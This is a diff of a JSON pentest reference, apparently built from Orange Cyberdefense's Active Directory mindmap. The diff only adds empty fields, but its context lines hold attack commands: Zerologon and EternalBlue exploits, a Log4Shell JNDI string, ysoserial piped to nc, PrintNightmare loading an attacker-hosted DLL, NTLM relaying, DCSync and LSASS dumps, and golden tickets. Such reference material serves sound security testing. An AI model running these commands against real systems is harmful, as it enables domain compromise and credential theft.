@@ -1,7 +1,7 @@
 {
   "source": "Orange-Cyberdefense/ocd-mindmaps",
   "version": "2025.03",
-  "generatedAt": "2026-07-31T18:01:28.744Z",
+  "generatedAt": "2026-08-01T08:55:05.472Z",
   "phases": [
     {
       "id": "no-creds",
@@ -28,6 +28,7 @@
             "nmap -Pn -sC -sV -p- -oA <output> <ip>",
             "nmap -sU -sC -sV -oA <output> <ip>"
           ],
+          "userCommands": [],
           "tools": [
             "nxc",
             "nmap"
@@ -51,6 +52,7 @@
             "nslookup -type=SRV _ldap._tcp.dc._msdcs.<domain>",
             "nmap -p 88 --open <ip_range>"
           ],
+          "userCommands": [],
           "tools": [
             "nmcli",
             "nslookup",
@@ -69,6 +71,7 @@
           "commands": [
             "dig axfr <domain_name> @<name_server>"
           ],
+          "userCommands": [],
           "tools": [
             "dig"
           ],
@@ -90,6 +93,7 @@
             "enum4linux-ng.py -a -u '' -p '' <ip>",
             "smbclient -U '%' -L //<ip>"
           ],
+          "userCommands": [],
           "tools": [
             "nxc",
             "enum4linux-ng.py",
@@ -110,6 +114,7 @@
             "nmap -n -sV --script 'ldap*' and not brute -p 389 <dc_ip>",
             "ldapsearch -x -H <dc_ip> -s base"
           ],
+          "userCommands": [],
           "tools": [
             "nmap",
             "ldapsearch"
@@ -132,6 +137,7 @@
             "nxc smb <dc_ip> --rid-brute 10000 # bruteforcing RID",
             "net rpc group members 'Domain Users' -W '<domain> -l <ip> -U '%'"
           ],
+          "userCommands": [],
           "tools": [
             "nxc",
             "net"
@@ -153,6 +159,7 @@
             "kerbrute userenum -d <domain> <userlist>",
             "nmap -p 88 --script=krb5-enum-users --script-args=\"krb5-enum-users.realm= '<domain>',userdb=<user_list_file>\" <dc_ip>"
           ],
+          "userCommands": [],
           "tools": [
             "kerbrute",
             "nmap"
@@ -178,6 +185,7 @@
             "asreqroast",
             "Pcredz -i <interface> -v"
           ],
+          "userCommands": [],
           "tools": [
             "responder",
             "mitm6",
@@ -202,6 +210,7 @@
           "commands": [
             "petitpotam.py -d <domain> <listener> <target>"
           ],
+          "userCommands": [],
           "tools": [
             "petitpotam.py"
           ],
@@ -224,6 +233,7 @@
             "tftp -i <dp_ip> GET \"\\xxx\\boot.var\"",
             "pxethief.py 5 '\\xxx\\boot.var'"
           ],
+          "userCommands": [],
           "tools": [
             "pxethief.py",
             "tftp"
@@ -244,6 +254,7 @@
           "commands": [
             "timeroast.py <dc_ip> -o <output_log>"
           ],
+          "userCommands": [],
           "tools": [
             "timeroast.py"
           ],
@@ -284,6 +295,7 @@
             "sprayhound -U <users.txt> -p <password> -d <domain> -dc  <dc_ip>",
             "kerbrute passwordspray -d <domain> <users.txt> <password>"
           ],
+          "userCommands": [],
           "tools": [
             "nxc",
             "Get-ADDefaultDomainPasswordPolicy",
@@ -316,6 +328,7 @@
             "GetUserSPNs.py -no-preauth \"<asrep_user>\" -usersfile \"<user_list.txt>\" -dc-host \"<dc_ip>\" \"<domain>\"/",
             "CVE-2022-33679.py <domain>/<user> <target>"
           ],
+          "userCommands": [],
           "tools": [
             "MATCH",
             "GetNPUsers.py",
@@ -353,6 +366,7 @@
             "zerologon-scan '<dc_netbios_name>' '<ip>'",
             "cve-2020-1472-exploit.py <MACHINE_BIOS_NAME> <ip>"
           ],
+          "userCommands": [],
           "tools": [
             "zerologon-scan",
             "cve-2020-1472-exploit.py"
@@ -372,6 +386,7 @@
           "commands": [
             "msf> exploit/windows/smb/ms17_010_eternalblue # SMBv1 only"
           ],
+          "userCommands": [],
           "tools": [
             "msf>"
           ],
@@ -392,6 +407,7 @@
             "msf> auxiliary/scanner/http/tomcat_enum",
             "msf> exploit/multi/http/tomcat_mgr_deploy"
           ],
+          "userCommands": [],
           "tools": [
             "msf>"
           ],
@@ -411,6 +427,7 @@
           "commands": [
             "msf> use exploit/multi/misc/java_rmi_server"
           ],
+          "userCommands": [],
           "tools": [
             "msf>"
           ],
@@ -430,6 +447,7 @@
           "commands": [
             "ysoserial.jar <gadget> '<cmd>' |nc <ip> <port>"
           ],
+          "userCommands": [],
           "tools": [
             "ysoserial.jar"
           ],
@@ -445,6 +463,7 @@
           "detail": "${jndi:ldap://<ip>:<port>/o=reference}",
           "tags": [],
           "commands": [],
+          "userCommands": [],
           "tools": [],
           "source": "low_hanging.md",
           "next": [
@@ -462,6 +481,7 @@
           "commands": [
             "msf> use auxiliary/admin/mssql/mssql_enum_sql_logins"
           ],
+          "userCommands": [],
           "tools": [
             "msf>"
           ],
@@ -482,6 +502,7 @@
           "commands": [
             "proxyshell_rce.py -u https://<exchange> -e administrator@<domain>"
           ],
+          "userCommands": [],
           "tools": [
             "proxyshell_rce.py"
           ],
@@ -506,6 +527,7 @@
             "CVE-2024-29855.py  --start_time <start_time_epoch> --end_time <end_time_epoch> --username <user>@<domain> --target https://<veeam_ip>:<veeam_port>/",
             "CVE-2024-40711.exe -f binaryformatter -g Veeam -c http://<attacker_ip>:8000/trigger --targetveeam <veeam_ip>"
           ],
+          "userCommands": [],
           "tools": [
             "VeeamHax.exe",
             "CVE-2023-27532",
@@ -531,6 +553,7 @@
           "commands": [
             "cve_2023_41320.py -u <user> -p <password> -t <ip>"
           ],
+          "userCommands": [],
           "tools": [
             "cve_2023_41320.py"
           ],
@@ -550,6 +573,7 @@
           "commands": [
             "nuclei -target <ip_range>"
           ],
+          "userCommands": [],
           "tools": [
             "nuclei"
           ],
@@ -578,6 +602,7 @@
             "responder -l <interface> #use --lm to force downgrade",
             "smbclient.py"
           ],
+          "userCommands": [],
           "tools": [
             "responder",
             "smbclient.py"
@@ -609,6 +634,7 @@
             "ntlmrelayx.py -t mssql://<ip> [-smb2support] -socks",
             "ntlmrelayx.py -t dcsync://<dc_to_ip> -smb2support -auth-smb <user>:<password>"
           ],
+          "userCommands": [],
           "tools": [
             "msf>",
             "ntlmrelayx.py",
@@ -633,6 +659,7 @@
           "commands": [
             "krbrelayx.py -t 'http://<pki>/certsrv/certfnsh.asp' --adcs --template DomainController -v '<target_netbios>$' -ip <attacker_ip>"
           ],
+          "userCommands": [],
           "tools": [
             "krbrelayx.py"
           ],
@@ -663,6 +690,7 @@
             "john --format=lm hash.txt --wordlist=<rockyou.txt>",
             "hashcat -m 3000 -a 0 hash.txt <rockyou.txt>"
           ],
+          "userCommands": [],
           "tools": [
             "john",
             "hashcat"
@@ -682,6 +710,7 @@
             "john --format=nt hash.txt --wordlist=<rockyou.txt>",
             "hashcat -m 1000 -a 0 hash.txt <rockyou.txt>"
           ],
+          "userCommands": [],
           "tools": [
             "john",
             "hashcat"
@@ -701,6 +730,7 @@
             "john --format=netntlm hash.txt --wordlist=<rockyou.txt>",
             "hashcat -m 1000 -a 0 hash.txt <rockyou.txt>"
           ],
+          "userCommands": [],
           "tools": [
             "john",
             "hashcat"
@@ -720,6 +750,7 @@
             "john --format=netntlmv2 hash.txt --wordlist=<rockyou.txt>",
             "hashcat -m 5600 -a 0 hash.txt <rockyou.txt>"
           ],
+          "userCommands": [],
           "tools": [
             "john",
             "hashcat"
@@ -739,6 +770,7 @@
             "john --format=krb5tgs hash.txt --wordlist=<rockyou.txt>",
             "hashcat -m 13100 -a 0 hash.txt <rockyou.txt>"
           ],
+          "userCommands": [],
           "tools": [
             "john",
             "hashcat"
@@ -756,6 +788,7 @@
           "commands": [
             "hashcat -m 19600 -a 0 hash.txt <rockyou.txt>"
           ],
+          "userCommands": [],
           "tools": [
             "hashcat"
           ],
@@ -772,6 +805,7 @@
           "commands": [
             "hashcat -m 18200 -a 0 hash.txt <rockyou.txt>"
           ],
+          "userCommands": [],
           "tools": [
             "hashcat"
           ],
@@ -788,6 +822,7 @@
           "commands": [
             "hashcat -m 2100 -a 0 hash.txt <rockyou.txt>"
           ],
+          "userCommands": [],
           "tools": [
             "hashcat"
           ],
@@ -804,6 +839,7 @@
           "commands": [
             "hashcat -m 31300 -a 3 hash.txt -w 3 ?l?l?l?l?l?l?l"
           ],
+          "userCommands": [],
           "tools": [
             "hashcat"
           ],
@@ -820,6 +856,7 @@
           "commands": [
             "hashcat -m 19850 -a 0 hash.txt <rockyou.txt>"
           ],
+          "userCommands": [],
           "tools": [
             "hashcat"
           ],
@@ -862,6 +899,7 @@
             "ldapsearch-ad.py -l <dc_ip> -d <domain> -u <user> -p '<password>' -o <output.log> -t all",
             "adidnsdump -u <domain>\\\\<user> -p \"<password>\" --print-zones <dc_ip>"
           ],
+          "userCommands": [],
           "tools": [
             "GetADUsers.py",
             "nxc",
@@ -896,6 +934,7 @@
             "certify.exe find",
             "certipy find -u <user>@<domain> -p '<password>' -dc-ip <dc_ip>"
           ],
+          "userCommands": [],
           "tools": [
             "certify.exe",
             "certipy"
@@ -919,6 +958,7 @@
             "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm",
             "SharpSCCM.exe local site-info"
           ],
+          "userCommands": [],
           "tools": [
             "sccmhunter.py",
             "ldeep",
@@ -941,6 +981,7 @@
             "PingCastle.exe --healthcheck --server <domain>",
             "Import-Module .\\adPEAS.ps1; Invoke-adPEAS -Domain '<domain>' -Server '<dc_fqdn>'"
           ],
+          "userCommands": [],
           "tools": [
             "AD-miner",
             "PingCastle.exe",
@@ -963,6 +1004,7 @@
             "GetUserSPNs.py -request -dc-ip <dc_ip> <domain>/<user>:<password>",
             "Rubeus.exe kerberoast"
           ],
+          "userCommands": [],
           "tools": [
             "MATCH",
             "GetUserSPNs.py",
@@ -993,6 +1035,7 @@
             "dnstool.py -u \"<domain>\\<user>\" -p '<password>' -d \"<attacker_ip>\" --action add \"<dns_server_ip>\" -r \"<servername>1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA\" --tcp",
             "petitpotam.py -u '<user>' -p '<password>' -d <domain> '<servername>1UWh...' <target>"
           ],
+          "userCommands": [],
           "tools": [
             "nxc",
             "[InternetShortcut]...",
@@ -1015,6 +1058,7 @@
           "commands": [
             "nxc ldap <dc_ip> -u '<user>' -p '<password>' -M get-desc-users |grep -i MSOL"
           ],
+          "userCommands": [],
           "tools": [
             "nxc"
           ],
@@ -1027,6 +1071,7 @@
           "detail": "Review the source condition and record the result.",
           "tags": [],
           "commands": [],
+          "userCommands": [],
           "tools": [],
           "source": "authenticated.md",
           "next": [
@@ -1039,6 +1084,7 @@
           "detail": "Review the source condition and record the result.",
           "tags": [],
           "commands": [],
+          "userCommands": [],
           "tools": [],
           "source": "authenticated.md",
           "next": []
@@ -1068,6 +1114,7 @@
             "mshta.exe my.hta",
             "MsBuild.exe pshell.xml"
           ],
+          "userCommands": [],
           "tools": [
             "Get-ChildItem",
             "installutil.exe",
@@ -1093,6 +1140,7 @@
             "wsreset.exe",
             "msdt.exe"
           ],
+          "userCommands": [],
           "tools": [
             "Fodhelper.exe",
             "wsreset.exe",
@@ -1115,6 +1163,7 @@
             "winPEASany_ofs.exe",
             ".\\PrivescCheck.ps1;  Invoke-PrivescCheck -Extended\""
           ],
+          "userCommands": [],
           "tools": [
             "winPEASany_ofs.exe",
             "PrivescCheck.ps1;"
@@ -1134,6 +1183,7 @@
           "commands": [
             "findstr /si 'pass' *.txt *.xml *.docx *.ini"
           ],
+          "userCommands": [],
           "tools": [
             "findstr"
           ],
@@ -1153,6 +1203,7 @@
           "commands": [
             "vssadmin list shadows"
           ],
+          "userCommands": [],
           "tools": [
             "vssadmin"
           ],
@@ -1173,6 +1224,7 @@
             "dnstool.py -u <domain>\\<user> -p <pass> --record 'attacker' --action add --data <ip_attacker> <dc_ip>",
             "petitpotam.py -u '<user>' -p <pass> -d '<domain>' \"attacker@80/random.txt\" <ip>"
           ],
+          "userCommands": [],
           "tools": [
             "dnstool.py",
             "petitpotam.py"
@@ -1191,6 +1243,7 @@
             "KrbRelayUp.exe relay -Domain <domain> -CreateNewComputerAccount -ComputerName <computer$> -ComputerPassword <password>",
             "KrbRelayUp.exe spawn -m rbcd -d <domain> -dc <dc> -cn <computer_name>-cp <omputer_pass>"
           ],
+          "userCommands": [],
           "tools": [
             "KrbRelayUp.exe"
           ],
@@ -1207,6 +1260,7 @@
             "CVE"
           ],
           "commands": [],
+          "userCommands": [],
           "tools": [],
           "source": "low_access.md",
           "next": [
@@ -1238,6 +1292,7 @@
             "msf> use auxiliary/admin/kerberos/ms14_068_kerberos_checksum",
             "goldenPac.py -dc-ip <dc_ip> <domain>/<user>:<password>@target"
           ],
+          "userCommands": [],
           "tools": [
             "findSMB2UPTime.py",
             "ms14-068.py",
@@ -1263,6 +1318,7 @@
             "findstr /S /I cpassword \\\\<domain_fqdn>\\sysvol\\<domain_fqdn>\\policies\\*.xml",
             "Get-GPPPassword.py <domain>/<user>:<password>@<dc_fqdn>"
           ],
+          "userCommands": [],
           "tools": [
             "msf>",
             "findstr",
@@ -1283,6 +1339,7 @@
           "commands": [
             "privexchange.py -ah <attacker_ip> <exchange_host> -u <user> -d <domain> -p <password>"
           ],
+          "userCommands": [],
           "tools": [
             "privexchange.py"
           ],
@@ -1303,6 +1360,7 @@
             "nxc smb <ip> -u 'user' -p 'pass' -M nopac #scan",
             "noPac.exe -domain <domain> -user <user> -pass <password> /dc <dc_fqdn> /mAccount <machine_account> /mPassword <machine_password> /service cifs /ptt"
           ],
+          "userCommands": [],
           "tools": [
             "nxc",
             "noPac.exe"
@@ -1322,6 +1380,7 @@
             "nxc smb <ip> -u 'user' -p 'pass' -M printnightmare #scan",
             "printnightmare.py -dll '\\\\<attacker_ip>\\smb\\add_user.dll' '<user>:<password>@<ip>'"
           ],
+          "userCommands": [],
           "tools": [
             "nxc",
             "printnightmare.py"
@@ -1343,6 +1402,7 @@
             "certipy req -u 'certifriedpc$'@<domain> -p 'certifriedpass' -target <ca_fqdn> -ca <ca_name> -template Machine",
             "certipy auth -pfx <pfx_file> -username '<dc>$' -domain <domain> -dc-ip <dc_ip>"
           ],
+          "userCommands": [],
           "tools": [
             "certipy"
           ],
@@ -1359,6 +1419,7 @@
           "commands": [
             "poc_aug3.py <host> <username> <password> <command>"
           ],
+          "userCommands": [],
           "tools": [
             "poc_aug3.py"
           ],
@@ -1389,6 +1450,7 @@
             "mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator",
             "secretsdump.py '<domain>'/'<user>':'<password>'@'<domain_controller>'"
           ],
+          "userCommands": [],
           "tools": [
             "mimikatz",
             "secretsdump.py"
@@ -1412,6 +1474,7 @@
             "certipy shadow auto '-u <user>@<domain>' -p <password> -account '<target_account>'",
             "pywhisker.py -d \"FQDN_DOMAIN\" -u \"user1\" -p \"CERTIFICATE_PASSWORD\" --target \"TARGET_SAMNAME\" --action \"list\""
           ],
+          "userCommands": [],
           "tools": [
             "certipy",
             "pywhisker.py"
@@ -1425,6 +1488,7 @@
           "detail": "GenericAll/GenericWrite/Self/Add Extended Rights · Add member to the group · Write Owner · Grant Ownership · WriteDACL + WriteOwner · Grant rights · Give yourself generic all",
           "tags": [],
           "commands": [],
+          "userCommands": [],
           "tools": [],
           "source": "acl.md",
           "next": []
@@ -1435,6 +1499,7 @@
           "detail": "GenericAll / GenericWrite · msDs-AllowedToActOnBehalf · add Key Credentials",
           "tags": [],
           "commands": [],
+          "userCommands": [],
           "tools": [],
           "source": "acl.md",
           "next": [
@@ -1453,6 +1518,7 @@
             "net user <user> <password> /domain",
             "targetedKerberoast.py -d <domain> -u <user> -p <pass>"
           ],
+          "userCommands": [],
           "tools": [
             "net",
             "targetedKerberoast.py"
@@ -1475,6 +1541,7 @@
           "commands": [
             "OUned.py --config config.ini"
           ],
+          "userCommands": [],
           "tools": [
             "OUned.py"
           ],
@@ -1495,6 +1562,7 @@
             "nxc ldap <ip> -u <user> -p <pass> --gmsa",
             "ldeep ldap -u <user> -p <password> -d <domain> -s ldaps://<dc_ip> gmsa"
           ],
+          "userCommands": [],
           "tools": [
             "gMSADumper.py",
             "nxc",
@@ -1520,6 +1588,7 @@
             "nxc ldap <dc_ip> -d <domain> -u <user> -p <password> --module laps",
             "msf> use post/windows/gather/credentials/enum_laps"
           ],
+          "userCommands": [],
           "tools": [
             "MATCH",
             "Get-LapsADPassword",
@@ -1547,6 +1616,7 @@
             "Get-DomainObjectAcl -SearchBase \"CN=Policies,CN=System,DC=blah,DC=com\" -ResolveGUIDs  | ? { $_.ObjectAceType -eq \"Group-Policy-Container\" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl",
             "Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq \"GP-Link\" -and $_.ActiveDirectoryRights -match \"WriteProperty\" } | select ObjectDN, SecurityIdentifier | fl"
           ],
+          "userCommands": [],
           "tools": [
             "MATCH",
             "Get-DomainObjectAcl",
@@ -1570,6 +1640,7 @@
             "dnscmd.exe /config /serverlevelplugindll <\\\\path\\to\\dll> # need a dnsadmin user",
             "sc \\\\DNSServer stop dns sc \\\\DNSServer start dns"
           ],
+          "userCommands": [],
           "tools": [
             "dnscmd.exe",
             "sc"
@@ -1604,6 +1675,7 @@
             "MATCH p=((c:Base)-[:AllowedToDelegate]->(t:Computer)) RETURN p",
             "MATCH p=shortestPath((u:User)-[*1..]->(c:Computer {name: \"<MYTARGET.FQDN>\"})) RETURN p"
           ],
+          "userCommands": [],
           "tools": [
             "findDelegation.py",
             "MATCH"
@@ -1625,6 +1697,7 @@
             "Rubeus.exe dump /luid:0xdeadbeef /nowrap",
             "Rubeus.exe monitor /interval:5"
           ],
+          "userCommands": [],
           "tools": [
             "mimikatz",
             "Rubeus.exe"
@@ -1651,6 +1724,7 @@
             "getST.py -spn host/<constrained> -impersonate Administrator --dc-ip <dc_ip> '<domain>/<rbcd_con>$:<rbcd_conpass>'",
             "getST.py -spn <constrained_spn>/<target> -hashes '<hash>' '<domain>/<constrained>$' -impersonate Administrator --dc-ip <dc_ip> -additional-ticket <previous_ticket>"
           ],
+          "userCommands": [],
           "tools": [
             "Rubeus.exe",
             "getST.py",
@@ -1676,6 +1750,7 @@
             "rbcd.py -delegate-from '<computer>$' -delegate-to '<target>$' -dc-ip '<dc>' -action 'write' <domain>/<user>:<password>",
             "getST.py -spn host/<dc_fqdn> '<domain>/<computer_account>:<computer_pass>' -impersonate Administrator --dc-ip <dc_ip>"
           ],
+          "userCommands": [],
           "tools": [
             "addcomputer.py",
             "Rubeus.exe",
@@ -1699,6 +1774,7 @@
             "getTGT.py -dc-ip \"<dc_ip>\" -hashes :\"<machine_hash>\" \"<domain>\"/\"<machine>$\"",
             "getST.py -self -impersonate \"<admin>\" -altservice \"cifs/<machine>\" -k -no-pass -dc-ip \"DomainController\" \"<domain>\"/'<machine>$'"
           ],
+          "userCommands": [],
           "tools": [
             "getTGT.py",
             "getST.py"
@@ -1736,6 +1812,7 @@
             "certutil -TCAInfo",
             "certify.exe cas"
           ],
+          "userCommands": [],
           "tools": [
             "certutil",
             "certify.exe",
@@ -1764,6 +1841,7 @@
             "certipy relay -target http://<ip_ca>",
             "certipy auth -pfx <certificate> -dc-ip <dc_ip>"
           ],
+          "userCommands": [],
           "tools": [
             "ntlmrelayx.py",
             "Rubeus.exe",
@@ -1797,6 +1875,7 @@
             "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<version 1 template with enrolee flag>' -ca <ca_name> --application-policies 'Certificate Request Agent' # [PR 228]",
             "certipy req -u <user>@<domain> -p <password> -target <ca_server> -template '<vulnerable template name>' -ca <ca_name> -on-behalf-of '<domain>\\<user>' -pfx <cert>"
           ],
+          "userCommands": [],
           "tools": [
             "certipy",
             "certify.exe"
@@ -1823,6 +1902,7 @@
             "certipy ca -u <user>@<domain> -p '<password>' -ca <ca_name> -issue-request <request_id>",
             "certipy req -u <user>@<domain> -p '<password>'  -ca <ca_name> -retreive <request_id>"
           ],
+          "userCommands": [],
           "tools": [
             "certipy"
           ],
@@ -1843,6 +1923,7 @@
             "certipy ca -backup -u <user>@<domain> -hashes <hash_nt> -ca <ca_name> -debug -target <ca_ip>",
             "certipy forge -ca-pfx '<adcs>.pfx' -upn administrator@<domain>"
           ],
+          "userCommands": [],
           "tools": [
             "certipy"
           ],
@@ -1868,6 +1949,7 @@
             "certipy relay -target rpc://<ip_ca> -ca '<ca_name>'",
             "certipy auth -pfx <certificate> -dc-ip <dc_ip>"
           ],
+          "userCommands": [],
           "tools": [
             "ntlmrelayx.py",
             "Rubeus.exe",
@@ -1895,6 +1977,7 @@
             "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn '<dc_name$>@<domain>'",
             "certipy account update -username <accountA>@<domain> -password <passA> -user <accountB> -upn <accountB>@<domain>"
           ],
+          "userCommands": [],
           "tools": [
             "certipy"
           ],
@@ -1929,6 +2012,7 @@
             "ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> sccm",
             "nxc smb <sccm_server> -u <user> -p <password> -d <domain> --shares"
           ],
+          "userCommands": [],
           "tools": [
             "sccmhunter.py",
             "ldeep",
@@ -1943,6 +2027,7 @@
           "detail": "Extract from pxe See no creds",
           "tags": [],
           "commands": [],
+          "userCommands": [],
           "tools": [],
           "source": "sccm.md",
           "next": [
@@ -1960,6 +2045,7 @@
           "commands": [
             "ntlmrelayx.py -tf <site_systems> -smb2support"
           ],
+          "userCommands": [],
           "tools": [
             "ntlmrelayx.py"
           ],
@@ -1982,6 +2068,7 @@
             "SharpSCCM.exe invoke client-push -mp <sccm_server>.<domain> -sc <site_code> -t <attacker_ip> # Launch client push install",
             "proxychains smbexec.py -no-pass <domain>/<socks_user>@<sccm_server>"
           ],
+          "userCommands": [],
           "tools": [
             "ntlmrelayx.py",
             "SharpSCCM.exe",
@@ -2006,6 +2093,7 @@
             "setspn -D host/<newcomputer> <newcomputer> setspn -D host/<newcomputer>.<domain> <newcomputer>",
             "ntlmrelayx.py -tf <no_signing_target> -smb2support -socks"
           ],
+          "userCommands": [],
           "tools": [
             "dnstool.py",
             "setspn",
@@ -2031,6 +2119,7 @@
             "SCCMSecrets.py files -dp http://<distribution_point> -u '<user>' -p '<password>'",
             "sccm-http-looter -server <ip_dp>"
           ],
+          "userCommands": [],
           "tools": [
             "cmloot.py",
             "SCCMSecrets.py",
@@ -2054,6 +2143,7 @@
             "ntlmrelayx.py -smb2support -ts -t mssql://<sccm_mssql> -q \"<query>\"",
             "sccmhunter.py admin -u <target_user>@<domain> -p '<password>' -ip <sccm_ip>"
           ],
+          "userCommands": [],
           "tools": [
             "sccmhunter.py",
             "ntlmrelayx.py"
@@ -2075,6 +2165,7 @@
             "ntlmrelayx.py -t <sccm_mssql> -smb2support -socks",
             "proxychains smbexec.py -no-pass <domain>/'<sccm_server>$'@<sccm_ip>"
           ],
+          "userCommands": [],
           "tools": [
             "ntlmrelayx.py",
             "smbexec.py"
@@ -2098,6 +2189,7 @@
             "policysecretunobfuscate.py",
             "SharpSCCM.exe get secrets -r newcomputer -u <computer_added>$ -p <computer_pass>\""
           ],
+          "userCommands": [],
           "tools": [
             "sccmwtf.py",
             "policysecretunobfuscate.py",
@@ -2123,6 +2215,7 @@
             "SharpSCCM.exe local secrets -m disk",
             "SharpSCCM.exe local secrets -m wmi"
           ],
+          "userCommands": [],
           "tools": [
             "dploot.py",
             "sccmhunter.py",
@@ -2149,6 +2242,7 @@
             "SELECT * FROM SC_UserAccount;",
             "sccmdecryptpoc.exe <cyphered_value>"
           ],
+          "userCommands": [],
           "tools": [
             "secretsdump.py",
             "mssqlclient.py",
@@ -2177,6 +2271,7 @@
             "interact <device_id>",
             "script xploit.ps1"
           ],
+          "userCommands": [],
           "tools": [
             "SharpSCCM.exe",
             "sccmhunter.py",
@@ -2198,6 +2293,7 @@
             "SharpSCCM.exe get devices -sms <SMS_PROVIDER> -sc <SITECODE> -n <NTLMRELAYX_LISTENER_IP> -p \"Name\" -p \"ResourceId\" -p \"SMSUniqueIdentifier\"",
             "SharpSCCM.exe remove device GUID:<GUID> -sms <SMS_PROVIDER> -sc <SITECODE>"
           ],
+          "userCommands": [],
           "tools": [
             "SharpSCCM.exe"
           ],
@@ -2214,6 +2310,7 @@
           "commands": [
             "SCCMHound.exe --server <server> --sitecode <sitecode>"
           ],
+          "userCommands": [],
           "tools": [
             "SCCMHound.exe"
           ],
@@ -2248,6 +2345,7 @@
             "nxc smb <ip_range> -u <user> -p <password> -M lsassy",
             "lsassy -d <domain> -u <user> -p <password> <ip>"
           ],
+          "userCommands": [],
           "tools": [
             "PPLdump64.exe",
             "mimikatz",
@@ -2281,6 +2379,7 @@
             "reg.py <domain>/<user>:<password>@<ip> backup -o '\\\\<smb_ip>\\share'",
             "regsecrets.py <domain>/<user>:<password>@<ip>"
           ],
+          "userCommands": [],
           "tools": [
             "nxc",
             "msf>",
@@ -2311,6 +2410,7 @@
             "secretsdump.py -system SYSTEM -security SECURITY",
             "reg.py <domain>/<user>:<password>@<ip> backup -o '\\\\<smb_ip>\\share'"
           ],
+          "userCommands": [],
           "tools": [
             "nxc",
             "mimikatz",
@@ -2344,6 +2444,7 @@
             "DPAPImk2john.py --preferred <prefered_file>",
             "DPAPImk2john.py -c domain -mk <masterkey> -S <sid>"
           ],
+          "userCommands": [],
           "tools": [
             "nxc",
             "donpapi",
@@ -2380,6 +2481,7 @@
             "query user",
             "tscon.exe <id> /dest:<session_name>"
           ],
+          "userCommands": [],
           "tools": [
             "msf>",
             "nxc",
@@ -2412,6 +2514,7 @@
             "azuread_decrypt_msol_v2.ps1",
             "nxc smb <ip> -u <user> -p <password> -M msol"
           ],
+          "userCommands": [],
           "tools": [
             "smbmap.py",
             "KeePwn.py",
@@ -2462,6 +2565,7 @@
             "nxc mssql <ip_range> -u <user> -p <password>",
             "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>"
           ],
+          "userCommands": [],
           "tools": [
             "psexec.py",
             "psexec.exe",
@@ -2505,6 +2609,7 @@
             "Rubeus.exe createnetonly /program:C:\\Windows\\System32\\[cmd.exe||upnpcont.exe]",
             "getTGT.py <domain>/<user> -hashes :<hashes>"
           ],
+          "userCommands": [],
           "tools": [
             "impacket",
             "nxc",
@@ -2541,6 +2646,7 @@
             "impacket tools: Same as Pass the hash but use : -aesKey for impacket (and use FQDN)",
             "proxychains secretsdump.py -aesKey <key> '<domain>'/'<user>'@'<ip>'"
           ],
+          "userCommands": [],
           "tools": [
             "ticketConverter.py",
             "export",
@@ -2572,6 +2678,7 @@
             "proxychains atexec.py  -no-pass  <domain>/<user>@<ip> \"command\"",
             "proxychains smbexec.py  -no-pass  <domain>/<user>@<ip>"
           ],
+          "userCommands": [],
           "tools": [
             "lookupsid.py",
             "mssqlclient.py",
@@ -2605,6 +2712,7 @@
             "certipy cert -pfx \"<pfx_file>\" -nocert -out \"user.key\"",
             "passthecert.py -action ldap-shell -crt <user.crt> -key <user.key> -domain <domain> -dc-ip <dc_ip>"
           ],
+          "userCommands": [],
           "tools": [
             "certipy",
             "gettgtpkinit.py",
@@ -2641,6 +2749,7 @@
             "sp_linkedservers",
             "use_link"
           ],
+          "userCommands": [],
           "tools": [
             "nxc",
             "MATCH",
@@ -2691,6 +2800,7 @@
             "mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\\administrator",
             "certsync -u <user> -p '<password>' -d <domain> -dc-ip <dc_ip> -ns <name_server>"
           ],
+          "userCommands": [],
           "tools": [
             "nxc",
             "secretsdump.py",
@@ -2715,6 +2825,7 @@
           "commands": [
             "donpapi collect - H ':<hash>' <domain>/<user>@<ip_range> -t ALL --fetch-pvk"
           ],
+          "userCommands": [],
           "tools": [
             "donpapi"
           ],
@@ -2753,6 +2864,7 @@
             "Get-DomainSID -Domain <domain> Get-DomainSID -Domain <target_domain>",
             "lookupsid.py -domain-sids <domain>/<user>:<password>'@<dc> 0 lookupsid.py -domain-sids <domain>/<user>:<password>'@<target_dc> 0"
           ],
+          "userCommands": [],
           "tools": [
             "nltest.exe",
             "([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()",
@@ -2786,6 +2898,7 @@
             "raiseChild.py <child_domain>/<user>:<password>",
             "ticketer.py -nthash <child_krbtgt_hash> -domain-sid <child_sid> -domain <child_domain> -extra-sid <parent_sid>-519 goldenuser"
           ],
+          "userCommands": [],
           "tools": [
             "mimikatz",
             "secretsdump.py",
@@ -2803,6 +2916,7 @@
           "detail": "same as Child to parent",
           "tags": [],
           "commands": [],
+          "userCommands": [],
           "tools": [],
           "source": "trusts.md",
           "next": []
@@ -2825,6 +2939,7 @@
             "secretsdump.py -just-dc-user '<domainB>' <domainA>/<user>:'<password>'@<dc_a>",
             "ticketer.py -nthash <trust_hash> -domain-sid <sid_a> -domain <domain_a> -extra-sid <domain_b_sid>-<group_sid sup 1000> -spn krbtgt/<domain_a> fakeuser"
           ],
+          "userCommands": [],
           "tools": [
             "MATCH",
             "mimikatz",
@@ -2851,6 +2966,7 @@
             "Get-SQLServerLinkCrawl -username <user> -password <pass> -Verbose -Instance <sql_instance>",
             "mssqlclient.py -windows-auth <domain>/<user>:<password>@<ip>"
           ],
+          "userCommands": [],
           "tools": [
             "Get-SQLServerLinkCrawl",
             "mssqlclient.py"
@@ -2878,6 +2994,7 @@
           "commands": [
             "net group \"domain admins\" myuser /add /domain"
           ],
+          "userCommands": [],
           "tools": [
             "net"
           ],
@@ -2896,6 +3013,7 @@
             "ticketer.py -aesKey <aeskey> -domain-sid <domain_sid> -domain <domain> <anyuser>",
             "mimikatz \"kerberos::golden /user:<admin_user> /domain:<domain> /sid:<domain-sid>/aes256:<krbtgt_aes256> /ptt\""
           ],
+          "userCommands": [],
           "tools": [
             "ticketer.py",
             "mimikatz"
@@ -2915,6 +3033,7 @@
